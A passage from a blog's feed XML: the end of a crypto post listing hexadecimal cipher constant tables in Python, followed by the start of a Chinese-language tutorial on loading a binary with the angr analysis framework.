class="hljs-number">0xEECEA50F</span>, <span class="hljs-number">0xDB2F953B</span>, <span class="hljs-number">0x2AEF7DAD</span>, <span class="hljs-number">0x5B6E2F84</span>,<br>     <span class="hljs-number">0x1521B628</span>, <span class="hljs-number">0x29076170</span>, <span class="hljs-number">0xECDD4775</span>, <span class="hljs-number">0x619F1510</span>,<br>     <span class="hljs-number">0x13CCA830</span>, <span class="hljs-number">0xEB61BD96</span>, <span class="hljs-number">0x0334FE1E</span>, <span class="hljs-number">0xAA0363CF</span>,<br>     <span class="hljs-number">0xB5735C90</span>, <span class="hljs-number">0x4C70A239</span>, <span class="hljs-number">0xD59E9E0B</span>, <span class="hljs-number">0xCBAADE14</span>,<br>     <span class="hljs-number">0xEECC86BC</span>, <span class="hljs-number">0x60622CA7</span>, <span class="hljs-number">0x9CAB5CAB</span>, <span class="hljs-number">0xB2F3846E</span>,<br>     <span class="hljs-number">0x648B1EAF</span>, <span class="hljs-number">0x19BDF0CA</span>, <span class="hljs-number">0xA02369B9</span>, <span class="hljs-number">0x655ABB50</span>,<br>     <span class="hljs-number">0x40685A32</span>, <span class="hljs-number">0x3C2AB4B3</span>, <span class="hljs-number">0x319EE9D5</span>, <span class="hljs-number">0xC021B8F7</span>,<br>     <span class="hljs-number">0x9B540B19</span>, <span class="hljs-number">0x875FA099</span>, <span class="hljs-number">0x95F7997E</span>, <span class="hljs-number">0x623D7DA8</span>,<br>     <span class="hljs-number">0xF837889A</span>, <span class="hljs-number">0x97E32D77</span>, <span class="hljs-number">0x11ED935F</span>, <span class="hljs-number">0x16681281</span>,<br>     <span class="hljs-number">0x0E358829</span>, <span class="hljs-number">0xC7E61FD6</span>, <span class="hljs-number">0x96DEDFA1</span>, <span class="hljs-number">0x7858BA99</span>,<br>     <span class="hljs-number">0x57F584A5</span>, <span class="hljs-number">0x1B227263</span>, <span class="hljs-number">0x9B83C3FF</span>, <span class="hljs-number">0x1AC24696</span>,<br>     <span class="hljs-number">0xCDB30AEB</span>, <span class="hljs-number">0x532E3054</span>, <span class="hljs-number">0x8FD948E4</span>, <span class="hljs-number">0x6DBC3128</span>,<br>     <span class="hljs-number">0x58EBF2EF</span>, <span class="hljs-number">0x34C6FFEA</span>, <span class="hljs-number">0xFE28ED61</span>, <span class="hljs-number">0xEE7C3C73</span>,<br>     <span class="hljs-number">0x5D4A14D9</span>, <span class="hljs-number">0xE864B7E3</span>, <span class="hljs-number">0x42105D14</span>, <span class="hljs-number">0x203E13E0</span>,<br>     <span class="hljs-number">0x45EEE2B6</span>, <span class="hljs-number">0xA3AAABEA</span>, <span class="hljs-number">0xDB6C4F15</span>, <span class="hljs-number">0xFACB4FD0</span>,<br>     <span class="hljs-number">0xC742F442</span>, <span class="hljs-number">0xEF6ABBB5</span>, <span class="hljs-number">0x654F3B1D</span>, <span class="hljs-number">0x41CD2105</span>,<br>     <span class="hljs-number">0xD81E799E</span>, <span class="hljs-number">0x86854DC7</span>, <span class="hljs-number">0xE44B476A</span>, <span class="hljs-number">0x3D816250</span>,<br>     <span class="hljs-number">0xCF62A1F2</span>, <span class="hljs-number">0x5B8D2646</span>, <span class="hljs-number">0xFC8883A0</span>, <span class="hljs-number">0xC1C7B6A3</span>,<br>     <span class="hljs-number">0x7F1524C3</span>, <span class="hljs-number">0x69CB7492</span>, <span class="hljs-number">0x47848A0B</span>, <span class="hljs-number">0x5692B285</span>,<br>     <span class="hljs-number">0x095BBF00</span>, <span class="hljs-number">0xAD19489D</span>, <span class="hljs-number">0x1462B174</span>, <span class="hljs-number">0x23820E00</span>,<br>     <span class="hljs-number">0x58428D2A</span>, <span class="hljs-number">0x0C55F5EA</span>, <span class="hljs-number">0x1DADF43E</span>, <span class="hljs-number">0x233F7061</span>,<br>     <span class="hljs-number">0x3372F092</span>, <span class="hljs-number">0x8D937E41</span>, <span class="hljs-number">0xD65FECF1</span>, <span class="hljs-number">0x6C223BDB</span>,<br>     <span class="hljs-number">0x7CDE3759</span>, <span class="hljs-number">0xCBEE7460</span>, <span class="hljs-number">0x4085F2A7</span>, <span class="hljs-number">0xCE77326E</span>,<br>     <span class="hljs-number">0xA6078084</span>, <span class="hljs-number">0x19F8509E</span>, <span class="hljs-number">0xE8EFD855</span>, <span class="hljs-number">0x61D99735</span>,<br>     <span class="hljs-number">0xA969A7AA</span>, <span class="hljs-number">0xC50C06C2</span>, <span class="hljs-number">0x5A04ABFC</span>, <span class="hljs-number">0x800BCADC</span>,<br>     <span class="hljs-number">0x9E447A2E</span>, <span class="hljs-number">0xC3453484</span>, <span class="hljs-number">0xFDD56705</span>, <span class="hljs-number">0x0E1E9EC9</span>,<br>     <span class="hljs-number">0xDB73DBD3</span>, <span class="hljs-number">0x105588CD</span>, <span class="hljs-number">0x675FDA79</span>, <span class="hljs-number">0xE3674340</span>,<br>     <span class="hljs-number">0xC5C43465</span>, <span class="hljs-number">0x713E38D8</span>, <span class="hljs-number">0x3D28F89E</span>, <span class="hljs-number">0xF16DFF20</span>,<br>     <span class="hljs-number">0x153E21E7</span>, <span class="hljs-number">0x8FB03D4A</span>, <span class="hljs-number">0xE6E39F2B</span>, <span class="hljs-number">0xDB83ADF7</span>],<br>    [<span class="hljs-number">0xE93D5A68</span>, <span class="hljs-number">0x948140F7</span>, <span class="hljs-number">0xF64C261C</span>, <span class="hljs-number">0x94692934</span>,<br>     <span class="hljs-number">0x411520F7</span>, <span class="hljs-number">0x7602D4F7</span>, <span class="hljs-number">0xBCF46B2E</span>, <span class="hljs-number">0xD4A20068</span>,<br>     <span class="hljs-number">0xD4082471</span>, <span class="hljs-number">0x3320F46A</span>, <span class="hljs-number">0x43B7D4B7</span>, <span class="hljs-number">0x500061AF</span>,<br>     <span class="hljs-number">0x1E39F62E</span>, <span class="hljs-number">0x97244546</span>, <span class="hljs-number">0x14214F74</span>, <span class="hljs-number">0xBF8B8840</span>,<br>     <span class="hljs-number">0x4D95FC1D</span>, <span class="hljs-number">0x96B591AF</span>, <span class="hljs-number">0x70F4DDD3</span>, <span class="hljs-number">0x66A02F45</span>,<br>     <span class="hljs-number">0xBFBC09EC</span>, <span class="hljs-number">0x03BD9785</span>, <span class="hljs-number">0x7FAC6DD0</span>, <span class="hljs-number">0x31CB8504</span>,<br>     <span class="hljs-number">0x96EB27B3</span>, <span class="hljs-number">0x55FD3941</span>, <span class="hljs-number">0xDA2547E6</span>, <span class="hljs-number">0xABCA0A9A</span>,<br>     <span class="hljs-number">0x28507825</span>, <span class="hljs-number">0x530429F4</span>, <span class="hljs-number">0x0A2C86DA</span>, <span class="hljs-number">0xE9B66DFB</span>,<br>     <span class="hljs-number">0x68DC1462</span>, <span class="hljs-number">0xD7486900</span>, <span class="hljs-number">0x680EC0A4</span>, <span class="hljs-number">0x27A18DEE</span>,<br>     <span class="hljs-number">0x4F3FFEA2</span>, <span class="hljs-number">0xE887AD8C</span>, <span class="hljs-number">0xB58CE006</span>, <span class="hljs-number">0x7AF4D6B6</span>,<br>     <span class="hljs-number">0xAACE1E7C</span>, <span class="hljs-number">0xD3375FEC</span>, <span class="hljs-number">0xCE78A399</span>, <span class="hljs-number">0x406B2A42</span>,<br>     <span class="hljs-number">0x20FE9E35</span>, <span class="hljs-number">0xD9F385B9</span>, <span class="hljs-number">0xEE39D7AB</span>, <span class="hljs-number">0x3B124E8B</span>,<br>     <span class="hljs-number">0x1DC9FAF7</span>, <span class="hljs-number">0x4B6D1856</span>, <span class="hljs-number">0x26A36631</span>, <span class="hljs-number">0xEAE397B2</span>,<br>     <span class="hljs-number">0x3A6EFA74</span>, <span class="hljs-number">0xDD5B4332</span>, <span class="hljs-number">0x6841E7F7</span>, <span class="hljs-number">0xCA7820FB</span>,<br>     <span class="hljs-number">0xFB0AF54E</span>, <span class="hljs-number">0xD8FEB397</span>, <span class="hljs-number">0x454056AC</span>, <span class="hljs-number">0xBA489527</span>,<br>     <span class="hljs-number">0x55533A3A</span>, <span class="hljs-number">0x20838D87</span>, <span class="hljs-number">0xFE6BA9B7</span>, <span class="hljs-number">0xD096954B</span>,<br>     <span class="hljs-number">0x55A867BC</span>, <span class="hljs-number">0xA1159A58</span>, <span class="hljs-number">0xCCA92963</span>, <span class="hljs-number">0x99E1DB33</span>,<br>     <span class="hljs-number">0xA62A4A56</span>, <span class="hljs-number">0x3F3125F9</span>, <span class="hljs-number">0x5EF47E1C</span>, <span class="hljs-number">0x9029317C</span>,<br>     <span class="hljs-number">0xFDF8E802</span>, <span class="hljs-number">0x04272F70</span>, <span class="hljs-number">0x80BB155C</span>, <span class="hljs-number">0x05282CE3</span>,<br>     <span class="hljs-number">0x95C11548</span>, <span class="hljs-number">0xE4C66D22</span>, <span class="hljs-number">0x48C1133F</span>, <span class="hljs-number">0xC70F86DC</span>,<br>     <span class="hljs-number">0x07F9C9EE</span>, <span class="hljs-number">0x41041F0F</span>, <span class="hljs-number">0x404779A4</span>, <span class="hljs-number">0x5D886E17</span>,<br>     <span class="hljs-number">0x325F51EB</span>, <span class="hljs-number">0xD59BC0D1</span>, <span class="hljs-number">0xF2BCC18F</span>, <span class="hljs-number">0x41113564</span>,<br>     <span class="hljs-number">0x257B7834</span>, <span class="hljs-number">0x602A9C60</span>, <span class="hljs-number">0xDFF8E8A3</span>, <span class="hljs-number">0x1F636C1B</span>,<br>     <span class="hljs-number">0x0E12B4C2</span>, <span class="hljs-number">0x02E1329E</span>, <span class="hljs-number">0xAF664FD1</span>, <span class="hljs-number">0xCAD18115</span>,<br>     <span class="hljs-number">0x6B2395E0</span>, <span class="hljs-number">0x333E92E1</span>, <span class="hljs-number">0x3B240B62</span>, <span class="hljs-number">0xEEBEB922</span>,<br>     <span class="hljs-number">0x85B2A20E</span>, <span class="hljs-number">0xE6BA0D99</span>, <span class="hljs-number">0xDE720C8C</span>, <span class="hljs-number">0x2DA2F728</span>,<br>     <span class="hljs-number">0xD0127845</span>, <span class="hljs-number">0x95B794FD</span>, <span class="hljs-number">0x647D0862</span>, <span class="hljs-number">0xE7CCF5F0</span>,<br>     <span class="hljs-number">0x5449A36F</span>, <span class="hljs-number">0x877D48FA</span>, <span class="hljs-number">0xC39DFD27</span>, <span class="hljs-number">0xF33E8D1E</span>,<br>     <span class="hljs-number">0x0A476341</span>, <span class="hljs-number">0x992EFF74</span>, <span class="hljs-number">0x3A6F6EAB</span>, <span class="hljs-number">0xF4F8FD37</span>,<br>     <span class="hljs-number">0xA812DC60</span>, <span class="hljs-number">0xA1EBDDF8</span>, <span class="hljs-number">0x991BE14C</span>, <span class="hljs-number">0xDB6E6B0D</span>,<br>     <span class="hljs-number">0xC67B5510</span>, <span class="hljs-number">0x6D672C37</span>, <span class="hljs-number">0x2765D43B</span>, <span class="hljs-number">0xDCD0E804</span>,<br>     <span class="hljs-number">0xF1290DC7</span>, <span class="hljs-number">0xCC00FFA3</span>, <span class="hljs-number">0xB5390F92</span>, <span class="hljs-number">0x690FED0B</span>,<br>     <span class="hljs-number">0x667B9FFB</span>, <span class="hljs-number">0xCEDB7D9C</span>, <span class="hljs-number">0xA091CF0B</span>, <span class="hljs-number">0xD9155EA3</span>,<br>     <span class="hljs-number">0xBB132F88</span>, <span class="hljs-number">0x515BAD24</span>, <span class="hljs-number">0x7B9479BF</span>, <span class="hljs-number">0x763BD6EB</span>,<br>     <span class="hljs-number">0x37392EB3</span>, <span class="hljs-number">0xCC115979</span>, <span class="hljs-number">0x8026E297</span>, <span class="hljs-number">0xF42E312D</span>,<br>     <span class="hljs-number">0x6842ADA7</span>, <span class="hljs-number">0xC66A2B3B</span>, <span class="hljs-number">0x12754CCC</span>, <span class="hljs-number">0x782EF11C</span>,<br>     <span class="hljs-number">0x6A124237</span>, <span class="hljs-number">0xB79251E7</span>, <span class="hljs-number">0x06A1BBE6</span>, <span class="hljs-number">0x4BFB6350</span>,<br>     <span class="hljs-number">0x1A6B1018</span>, <span class="hljs-number">0x11CAEDFA</span>, <span class="hljs-number">0x3D25BDD8</span>, <span class="hljs-number">0xE2E1C3C9</span>,<br>     <span class="hljs-number">0x44421659</span>, <span class="hljs-number">0x0A121386</span>, <span class="hljs-number">0xD90CEC6E</span>, <span class="hljs-number">0xD5ABEA2A</span>,<br>     <span class="hljs-number">0x64AF674E</span>, <span class="hljs-number">0xDA86A85F</span>, <span class="hljs-number">0xBEBFE988</span>, <span class="hljs-number">0x64E4C3FE</span>,<br>     <span class="hljs-number">0x9DBC8057</span>, <span class="hljs-number">0xF0F7C086</span>, <span class="hljs-number">0x60787BF8</span>, <span class="hljs-number">0x6003604D</span>,<br>     <span class="hljs-number">0xD1FD8346</span>, <span class="hljs-number">0xF6381FB0</span>, <span class="hljs-number">0x7745AE04</span>, <span class="hljs-number">0xD736FCCC</span>,<br>     <span class="hljs-number">0x83426B33</span>, <span class="hljs-number">0xF01EAB71</span>, <span class="hljs-number">0xB0804187</span>, <span class="hljs-number">0x3C005E5F</span>,<br>     <span class="hljs-number">0x77A057BE</span>, <span class="hljs-number">0xBDE8AE24</span>, <span class="hljs-number">0x55464299</span>, <span class="hljs-number">0xBF582E61</span>,<br>     <span class="hljs-number">0x4E58F48F</span>, <span class="hljs-number">0xF2DDFDA2</span>, <span class="hljs-number">0xF474EF38</span>, <span class="hljs-number">0x8789BDC2</span>,<br>     <span class="hljs-number">0x5366F9C3</span>, <span class="hljs-number">0xC8B38E74</span>, <span class="hljs-number">0xB475F255</span>, <span class="hljs-number">0x46FCD9B9</span>,<br>     <span class="hljs-number">0x7AEB2661</span>, <span class="hljs-number">0x8B1DDF84</span>, <span class="hljs-number">0x846A0E79</span>, <span class="hljs-number">0x915F95E2</span>,<br>     <span class="hljs-number">0x466E598E</span>, <span class="hljs-number">0x20B45770</span>, <span class="hljs-number">0x8CD55591</span>, <span class="hljs-number">0xC902DE4C</span>,<br>     <span class="hljs-number">0xB90BACE1</span>, <span class="hljs-number">0xBB8205D0</span>, <span class="hljs-number">0x11A86248</span>, <span class="hljs-number">0x7574A99E</span>,<br>     <span class="hljs-number">0xB77F19B6</span>, <span class="hljs-number">0xE0A9DC09</span>, <span class="hljs-number">0x662D09A1</span>, <span class="hljs-number">0xC4324633</span>,<br>     <span class="hljs-number">0xE85A1F02</span>, <span class="hljs-number">0x09F0BE8C</span>, <span class="hljs-number">0x4A99A025</span>, <span class="hljs-number">0x1D6EFE10</span>,<br>     <span class="hljs-number">0x1AB93D1D</span>, <span class="hljs-number">0x0BA5A4DF</span>, <span class="hljs-number">0xA186F20F</span>, <span class="hljs-number">0x2868F169</span>,<br>     <span class="hljs-number">0xDCB7DA83</span>, <span class="hljs-number">0x573906FE</span>, <span class="hljs-number">0xA1E2CE9B</span>, <span class="hljs-number">0x4FCD7F52</span>,<br>     <span class="hljs-number">0x50115E01</span>, <span class="hljs-number">0xA70683FA</span>, <span class="hljs-number">0xA002B5C4</span>, <span class="hljs-number">0x0DE6D027</span>,<br>     <span class="hljs-number">0x9AF88C27</span>, <span class="hljs-number">0x773F8641</span>, <span class="hljs-number">0xC3604C06</span>, <span class="hljs-number">0x61A806B5</span>,<br>     <span class="hljs-number">0xF0177A28</span>, <span class="hljs-number">0xC0F586E0</span>, <span class="hljs-number">0x006058AA</span>, <span class="hljs-number">0x30DC7D62</span>,<br>     <span class="hljs-number">0x11E69ED7</span>, <span class="hljs-number">0x2338EA63</span>, <span class="hljs-number">0x53C2DD94</span>, <span class="hljs-number">0xC2C21634</span>,<br>     <span class="hljs-number">0xBBCBEE56</span>, <span class="hljs-number">0x90BCB6DE</span>, <span class="hljs-number">0xEBFC7DA1</span>, <span class="hljs-number">0xCE591D76</span>,<br>     <span class="hljs-number">0x6F05E409</span>, <span class="hljs-number">0x4B7C0188</span>, <span class="hljs-number">0x39720A3D</span>, <span class="hljs-number">0x7C927C24</span>,<br>     <span class="hljs-number">0x86E3725F</span>, <span class="hljs-number">0x724D9DB9</span>, <span class="hljs-number">0x1AC15BB4</span>, <span class="hljs-number">0xD39EB8FC</span>,<br>     <span class="hljs-number">0xED545578</span>, <span class="hljs-number">0x08FCA5B5</span>, <span class="hljs-number">0xD83D7CD3</span>, <span class="hljs-number">0x4DAD0FC4</span>,<br>     <span class="hljs-number">0x1E50EF5E</span>, <span class="hljs-number">0xB161E6F8</span>, <span class="hljs-number">0xA28514D9</span>, <span class="hljs-number">0x6C51133C</span>,<br>     <span class="hljs-number">0x6FD5C7E7</span>, <span class="hljs-number">0x56E14EC4</span>, <span class="hljs-number">0x362ABFCE</span>, <span class="hljs-number">0xDDC6C837</span>,<br>     <span class="hljs-number">0xD79A3234</span>, <span class="hljs-number">0x92638212</span>, <span class="hljs-number">0x670EFA8E</span>, <span class="hljs-number">0x406000E0</span>],<br>    [<span class="hljs-number">0x3A39CE37</span>, <span class="hljs-number">0xD3FAF5CF</span>, <span class="hljs-number">0xABC27737</span>, <span class="hljs-number">0x5AC52D1B</span>,<br>     <span class="hljs-number">0x5CB0679E</span>, <span class="hljs-number">0x4FA33742</span>, <span class="hljs-number">0xD3822740</span>, <span class="hljs-number">0x99BC9BBE</span>,<br>     <span class="hljs-number">0xD5118E9D</span>, <span class="hljs-number">0xBF0F7315</span>, <span class="hljs-number">0xD62D1C7E</span>, <span class="hljs-number">0xC700C47B</span>,<br>     <span class="hljs-number">0xB78C1B6B</span>, <span class="hljs-number">0x21A19045</span>, <span class="hljs-number">0xB26EB1BE</span>, <span class="hljs-number">0x6A366EB4</span>,<br>     <span class="hljs-number">0x5748AB2F</span>, <span class="hljs-number">0xBC946E79</span>, <span class="hljs-number">0xC6A376D2</span>, <span class="hljs-number">0x6549C2C8</span>,<br>     <span class="hljs-number">0x530FF8EE</span>, <span class="hljs-number">0x468DDE7D</span>, <span class="hljs-number">0xD5730A1D</span>, <span class="hljs-number">0x4CD04DC6</span>,<br>     <span class="hljs-number">0x2939BBDB</span>, <span class="hljs-number">0xA9BA4650</span>, <span class="hljs-number">0xAC9526E8</span>, <span class="hljs-number">0xBE5EE304</span>,<br>     <span class="hljs-number">0xA1FAD5F0</span>, <span class="hljs-number">0x6A2D519A</span>, <span class="hljs-number">0x63EF8CE2</span>, <span class="hljs-number">0x9A86EE22</span>,<br>     <span class="hljs-number">0xC089C2B8</span>, <span class="hljs-number">0x43242EF6</span>, <span class="hljs-number">0xA51E03AA</span>, <span class="hljs-number">0x9CF2D0A4</span>,<br>     <span class="hljs-number">0x83C061BA</span>, <span class="hljs-number">0x9BE96A4D</span>, <span class="hljs-number">0x8FE51550</span>, <span class="hljs-number">0xBA645BD6</span>,<br>     <span class="hljs-number">0x2826A2F9</span>, <span class="hljs-number">0xA73A3AE1</span>, <span class="hljs-number">0x4BA99586</span>, <span class="hljs-number">0xEF5562E9</span>,<br>     <span class="hljs-number">0xC72FEFD3</span>, <span class="hljs-number">0xF752F7DA</span>, <span class="hljs-number">0x3F046F69</span>, <span class="hljs-number">0x77FA0A59</span>,<br>     <span class="hljs-number">0x80E4A915</span>, <span class="hljs-number">0x87B08601</span>, <span class="hljs-number">0x9B09E6AD</span>, <span class="hljs-number">0x3B3EE593</span>,<br>     <span class="hljs-number">0xE990FD5A</span>, <span class="hljs-number">0x9E34D797</span>, <span class="hljs-number">0x2CF0B7D9</span>, <span class="hljs-number">0x022B8B51</span>,<br>     <span class="hljs-number">0x96D5AC3A</span>, <span class="hljs-number">0x017DA67D</span>, <span class="hljs-number">0xD1CF3ED6</span>, <span class="hljs-number">0x7C7D2D28</span>,<br>     <span class="hljs-number">0x1F9F25CF</span>, <span class="hljs-number">0xADF2B89B</span>, <span class="hljs-number">0x5AD6B472</span>, <span class="hljs-number">0x5A88F54C</span>,<br>     <span class="hljs-number">0xE029AC71</span>, <span class="hljs-number">0xE019A5E6</span>, <span class="hljs-number">0x47B0ACFD</span>, <span class="hljs-number">0xED93FA9B</span>,<br>     <span class="hljs-number">0xE8D3C48D</span>, <span class="hljs-number">0x283B57CC</span>, <span class="hljs-number">0xF8D56629</span>, <span class="hljs-number">0x79132E28</span>,<br>     <span class="hljs-number">0x785F0191</span>, <span class="hljs-number">0xED756055</span>, <span class="hljs-number">0xF7960E44</span>, <span class="hljs-number">0xE3D35E8C</span>,<br>     <span class="hljs-number">0x15056DD4</span>, <span class="hljs-number">0x88F46DBA</span>, <span class="hljs-number">0x03A16125</span>, <span class="hljs-number">0x0564F0BD</span>,<br>     <span class="hljs-number">0xC3EB9E15</span>, <span class="hljs-number">0x3C9057A2</span>, <span class="hljs-number">0x97271AEC</span>, <span class="hljs-number">0xA93A072A</span>,<br>     <span class="hljs-number">0x1B3F6D9B</span>, <span class="hljs-number">0x1E6321F5</span>, <span class="hljs-number">0xF59C66FB</span>, <span class="hljs-number">0x26DCF319</span>,<br>     <span class="hljs-number">0x7533D928</span>, <span class="hljs-number">0xB155FDF5</span>, <span class="hljs-number">0x03563482</span>, <span class="hljs-number">0x8ABA3CBB</span>,<br>     <span class="hljs-number">0x28517711</span>, <span class="hljs-number">0xC20AD9F8</span>, <span class="hljs-number">0xABCC5167</span>, <span class="hljs-number">0xCCAD925F</span>,<br>     <span class="hljs-number">0x4DE81751</span>, <span class="hljs-number">0x3830DC8E</span>, <span class="hljs-number">0x379D5862</span>, <span class="hljs-number">0x9320F991</span>,<br>     <span class="hljs-number">0xEA7A90C2</span>, <span class="hljs-number">0xFB3E7BCE</span>, <span class="hljs-number">0x5121CE64</span>, <span class="hljs-number">0x774FBE32</span>,<br>     <span class="hljs-number">0xA8B6E37E</span>, <span class="hljs-number">0xC3293D46</span>, <span class="hljs-number">0x48DE5369</span>, <span class="hljs-number">0x6413E680</span>,<br>     <span class="hljs-number">0xA2AE0810</span>, <span class="hljs-number">0xDD6DB224</span>, <span class="hljs-number">0x69852DFD</span>, <span class="hljs-number">0x09072166</span>,<br>     <span class="hljs-number">0xB39A460A</span>, <span class="hljs-number">0x6445C0DD</span>, <span class="hljs-number">0x586CDECF</span>, <span class="hljs-number">0x1C20C8AE</span>,<br>     <span class="hljs-number">0x5BBEF7DD</span>, <span class="hljs-number">0x1B588D40</span>, <span class="hljs-number">0xCCD2017F</span>, <span class="hljs-number">0x6BB4E3BB</span>,<br>     <span class="hljs-number">0xDDA26A7E</span>, <span class="hljs-number">0x3A59FF45</span>, <span class="hljs-number">0x3E350A44</span>, <span class="hljs-number">0xBCB4CDD5</span>,<br>     <span class="hljs-number">0x72EACEA8</span>, <span class="hljs-number">0xFA6484BB</span>, <span class="hljs-number">0x8D6612AE</span>, <span class="hljs-number">0xBF3C6F47</span>,<br>     <span class="hljs-number">0xD29BE463</span>, <span class="hljs-number">0x542F5D9E</span>, <span class="hljs-number">0xAEC2771B</span>, <span class="hljs-number">0xF64E6370</span>,<br>     <span class="hljs-number">0x740E0D8D</span>, <span class="hljs-number">0xE75B1357</span>, <span class="hljs-number">0xF8721671</span>, <span class="hljs-number">0xAF537D5D</span>,<br>     <span class="hljs-number">0x4040CB08</span>, <span class="hljs-number">0x4EB4E2CC</span>, <span class="hljs-number">0x34D2466A</span>, <span class="hljs-number">0x0115AF84</span>,<br>     <span class="hljs-number">0xE1B00428</span>, <span class="hljs-number">0x95983A1D</span>, <span class="hljs-number">0x06B89FB4</span>, <span class="hljs-number">0xCE6EA048</span>,<br>     <span class="hljs-number">0x6F3F3B82</span>, <span class="hljs-number">0x3520AB82</span>, <span class="hljs-number">0x011A1D4B</span>, <span class="hljs-number">0x277227F8</span>,<br>     <span class="hljs-number">0x611560B1</span>, <span class="hljs-number">0xE7933FDC</span>, <span class="hljs-number">0xBB3A792B</span>, <span class="hljs-number">0x344525BD</span>,<br>     <span class="hljs-number">0xA08839E1</span>, <span class="hljs-number">0x51CE794B</span>, <span class="hljs-number">0x2F32C9B7</span>, <span class="hljs-number">0xA01FBAC9</span>,<br>     <span class="hljs-number">0xE01CC87E</span>, <span class="hljs-number">0xBCC7D1F6</span>, <span class="hljs-number">0xCF0111C3</span>, <span class="hljs-number">0xA1E8AAC7</span>,<br>     <span class="hljs-number">0x1A908749</span>, <span class="hljs-number">0xD44FBD9A</span>, <span class="hljs-number">0xD0DADECB</span>, <span class="hljs-number">0xD50ADA38</span>,<br>     <span class="hljs-number">0x0339C32A</span>, <span class="hljs-number">0xC6913667</span>, <span class="hljs-number">0x8DF9317C</span>, <span class="hljs-number">0xE0B12B4F</span>,<br>     <span class="hljs-number">0xF79E59B7</span>, <span class="hljs-number">0x43F5BB3A</span>, <span class="hljs-number">0xF2D519FF</span>, <span class="hljs-number">0x27D9459C</span>,<br>     <span class="hljs-number">0xBF97222C</span>, <span class="hljs-number">0x15E6FC2A</span>, <span class="hljs-number">0x0F91FC71</span>, <span class="hljs-number">0x9B941525</span>,<br>     <span class="hljs-number">0xFAE59361</span>, <span class="hljs-number">0xCEB69CEB</span>, <span class="hljs-number">0xC2A86459</span>, <span class="hljs-number">0x12BAA8D1</span>,<br>     <span class="hljs-number">0xB6C1075E</span>, <span class="hljs-number">0xE3056A0C</span>, <span class="hljs-number">0x10D25065</span>, <span class="hljs-number">0xCB03A442</span>,<br>     <span class="hljs-number">0xE0EC6E0E</span>, <span class="hljs-number">0x1698DB3B</span>, <span class="hljs-number">0x4C98A0BE</span>, <span class="hljs-number">0x3278E964</span>,<br>     <span class="hljs-number">0x9F1F9532</span>, <span class="hljs-number">0xE0D392DF</span>, <span class="hljs-number">0xD3A0342B</span>, <span class="hljs-number">0x8971F21E</span>,<br>     <span class="hljs-number">0x1B0A7441</span>, <span class="hljs-number">0x4BA3348C</span>, <span class="hljs-number">0xC5BE7120</span>, <span class="hljs-number">0xC37632D8</span>,<br>     <span class="hljs-number">0xDF359F8D</span>, <span class="hljs-number">0x9B992F2E</span>, <span class="hljs-number">0xE60B6F47</span>, <span class="hljs-number">0x0FE3F11D</span>,<br>     <span class="hljs-number">0xE54CDA54</span>, <span class="hljs-number">0x1EDAD891</span>, <span class="hljs-number">0xCE6279CF</span>, <span class="hljs-number">0xCD3E7E6F</span>,<br>     <span class="hljs-number">0x1618B166</span>, <span class="hljs-number">0xFD2C1D05</span>, <span class="hljs-number">0x848FD2C5</span>, <span class="hljs-number">0xF6FB2299</span>,<br>     <span class="hljs-number">0xF523F357</span>, <span class="hljs-number">0xA6327623</span>, <span class="hljs-number">0x93A83531</span>, <span class="hljs-number">0x56CCCD02</span>,<br>     <span class="hljs-number">0xACF08162</span>, <span class="hljs-number">0x5A75EBB5</span>, <span class="hljs-number">0x6E163697</span>, <span class="hljs-number">0x88D273CC</span>,<br>     <span class="hljs-number">0xDE966292</span>, <span class="hljs-number">0x81B949D0</span>, <span class="hljs-number">0x4C50901B</span>, <span class="hljs-number">0x71C65614</span>,<br>     <span class="hljs-number">0xE6C6C7BD</span>, <span class="hljs-number">0x327A140A</span>, <span class="hljs-number">0x45E1D006</span>, <span class="hljs-number">0xC3F27B9A</span>,<br>     <span class="hljs-number">0xC9AA53FD</span>, <span class="hljs-number">0x62A80F00</span>, <span class="hljs-number">0xBB25BFE2</span>, <span class="hljs-number">0x35BDD2F6</span>,<br>     <span class="hljs-number">0x71126905</span>, <span class="hljs-number">0xB2040222</span>, <span class="hljs-number">0xB6CBCF7C</span>, <span class="hljs-number">0xCD769C2B</span>,<br>     <span class="hljs-number">0x53113EC0</span>, <span class="hljs-number">0x1640E3D3</span>, <span class="hljs-number">0x38ABBD60</span>, <span class="hljs-number">0x2547ADF0</span>,<br>     <span class="hljs-number">0xBA38209C</span>, <span class="hljs-number">0xF746CE76</span>, <span class="hljs-number">0x77AFA1C5</span>, <span class="hljs-number">0x20756060</span>,<br>     <span class="hljs-number">0x85CBFE4E</span>, <span class="hljs-number">0x8AE88DD8</span>, <span class="hljs-number">0x7AAAF9B0</span>, <span class="hljs-number">0x4CF9AA7E</span>,<br>     <span class="hljs-number">0x1948C25C</span>, <span class="hljs-number">0x02FB8A8C</span>, <span class="hljs-number">0x01C36AE4</span>, <span class="hljs-number">0xD6EBE1F9</span>,<br>     <span class="hljs-number">0x90D4F869</span>, <span class="hljs-number">0xA65CDEA0</span>, <span class="hljs-number">0x3F09252D</span>, <span class="hljs-number">0xC208E69F</span>,<br>     <span class="hljs-number">0xB74E6132</span>, <span class="hljs-number">0xCE77E25B</span>, <span class="hljs-number">0x578FDFE3</span>, <span class="hljs-number">0x3AC372E6</span>]]<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Loading a Binary</title>
    <link href="/2023/05/26/Loading%20a%20Binary/"/>
    <url>/2023/05/26/Loading%20a%20Binary/</url>
    
    <content type="html"><![CDATA[<p><a href="https://docs.angr.io/en/latest/core-concepts/loading.html">Loading a Binary</a></p><span id="more"></span><p>angr是通过CLE模块来装载一个二进制文件，也就是说CLE的接口也可以用于angr。</p><h2 id="The-Loader"><a href="#The-Loader" class="headerlink" title="The Loader"></a>The Loader</h2><p>目前我们可以用以下几行代码装载一个二进制文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr, monkeyhex<br>proj = angr.Project(<span class="hljs-string">&#x27;examples/fauxware/fauxware&#x27;</span>)<br>proj.loader<br>&lt;Loaded fauxware, maps [<span class="hljs-number">0x400000</span>:<span class="hljs-number">0x5008000</span>]&gt;<br></code></pre></td></tr></table></figure><h3 id="Loaded-Objects"><a href="#Loaded-Objects" class="headerlink" title="Loaded Objects"></a>Loaded 